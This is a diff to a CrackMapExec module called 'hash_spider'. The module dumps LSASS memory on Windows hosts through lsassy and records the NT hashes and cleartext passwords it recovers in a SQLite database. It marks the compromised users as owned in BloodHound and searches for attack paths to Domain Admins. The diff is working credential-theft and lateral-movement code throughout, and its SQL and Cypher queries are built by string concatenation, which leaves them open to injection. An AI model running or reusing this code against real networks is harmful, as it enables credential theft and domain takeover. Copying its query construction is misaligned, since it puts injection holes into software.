@@ -3,20 +3,22 @@
 
 import configparser
 from ctypes import create_unicode_buffer
-from operator import mod
+from operator import contains
 from types import MethodType
+
+from urllib3 import Retry
 from neo4j import GraphDatabase, basic_auth
 from neo4j.exceptions import AuthError, ServiceUnavailable
 import sqlite3
 import sys
 import os
 from cme.modules.lsassy_dump import CMEModule as lsassy
+from cme.logger import CMEAdapter
 from lsassy import logger
 from lsassy.dumper import Dumper
 from lsassy.parser import Parser
 from lsassy.session import Session
 from lsassy.impacketfile import ImpacketFile
-from icecream import ic
 
 config = configparser.ConfigParser()
 cme_path = os.path.expanduser('~/.cme')
@@ -33,6 +35,8 @@ cursor = dbconnection.cursor()
 credentials_data = []
 admin_results = []
 found_users = []
+reported_da = []
+
 
 def neo4j_conn(context):
     if config.get('BloodHound', 'bh_enabled') != "False":
@@ -67,7 +71,7 @@ def create_db(local_admins):
     for result in local_admins:
         cursor.execute("INSERT OR IGNORE INTO pc_and_admins(pc_name, local_admins, dumped) VALUES(?, ?, ?)", (result.get('COMPUTER'),str(result.get('USERS'),),'FALSE'))
     dbconnection.commit()
-    cursor.execute('''CREATE TABLE if not exists admin_users("username" TEXT UNIQUE, "hash" TEXT)''')
+    cursor.execute('''CREATE TABLE if not exists admin_users("username" TEXT UNIQUE, "hash" TEXT, "password" TEXT)''')
     admin_users = []
     for result in local_admins:
         for user in result.get('USERS'):
@@ -79,27 +83,37 @@ def create_db(local_admins):
 
 def process_creds(context, connection, credentials_data):
     for result in credentials_data:
-        username = result["username"]
+        username = result["username"].upper().split('@')[0]
         nthash = result["nthash"]
+        password = result["password"]
+        if result["password"] != None:
+            context.log.success(f"Found a cleartext password for: {username}:{password} on {connection.host}. Adding to the DB and marking user as owned in BH.")
+            cursor.execute("UPDATE admin_users SET password = ? WHERE username LIKE '" + username + "%'", [password])
+            username = (f"{username.upper()}@{connection.domain.upper()}")
+            dbconnection.commit()
+            session = driver.session()
+            session.run('MATCH (u) WHERE (u.name = "' + username + '") SET u.owned=True RETURN u,u.name,u.owned')
         if nthash == 'aad3b435b51404eeaad3b435b51404ee' or nthash =='31d6cfe0d16ae931b73c59d7e0c089c0':
             context.log.error(f"Hash for {username} is expired.")
-        elif username not in found_users:
-            context.log.success(f"Found hashes for: {username}:{nthash} on {connection.hostname}. Adding them to the DB. Marking user and PC as owned in BH.")
+        elif username not in found_users and nthash != None:
+            context.log.success(f"Found hashes for: {username}:{nthash} on {connection.hostname}. Adding them to the DB and marking user as owned in BH.")
             found_users.append(username)
             cursor.execute("UPDATE admin_users SET hash = ? WHERE username LIKE '" + username + "%'", [nthash])
             dbconnection.commit()
             username = (f"{username.upper()}@{connection.domain.upper()}")
-            hostname = (f"{connection.hostname.upper()}.{connection.domain.upper()}")
             session = driver.session()
             session.run('MATCH (u) WHERE (u.name = "' + username + '") SET u.owned=True RETURN u,u.name,u.owned')
-            session.run('MATCH (c) WHERE (c.name = "' + hostname + '") SET c.owned=True RETURN c,c.name,c.owned')
             path_to_da = session.run("MATCH p=shortestPath((n)-[*1..]->(m)) WHERE exists(n.owned) AND m.name=~ '.*DOMAIN ADMINS.*' RETURN p")
             paths = [record for record in path_to_da.data()]
             for path in paths:
                 if path:
-                    for path in path['p']:
-                        context.log.success(f"You have a valid path to DA as {path['name']}.")
-                        sys.exit()
+                    for key,value in path.items():
+                        for item in value:
+                            if type(item) == dict:
+                                if {item['name']} not in reported_da:
+                                    context.log.success(f"You have a valid path to DA as {item['name']}.")
+                                    reported_da.append({item['name']})
+                                sys.exit()
             
 class CMEModule:
     name = 'hash_spider'
@@ -110,13 +124,12 @@ class CMEModule:
 
     def options(self, context, module_options):
         """
-            unmark_dumped       Sets dumped to False to re-dump (default: False)
             METHOD              Method to use to dump lsass.exe with lsassy
         """
         self.method = 'comsvcs'
         if 'METHOD' in module_options:
             self.method = module_options['METHOD']
-        
+
     def run_lsassy(self, context, connection): # Couldn't figure out how to properly retrieve output from the module without editing. Blatantly ripped from lsassy_dump.py. Thanks pixis - @hackanddo!
         logger.init(quiet=True)
         host = connection.host
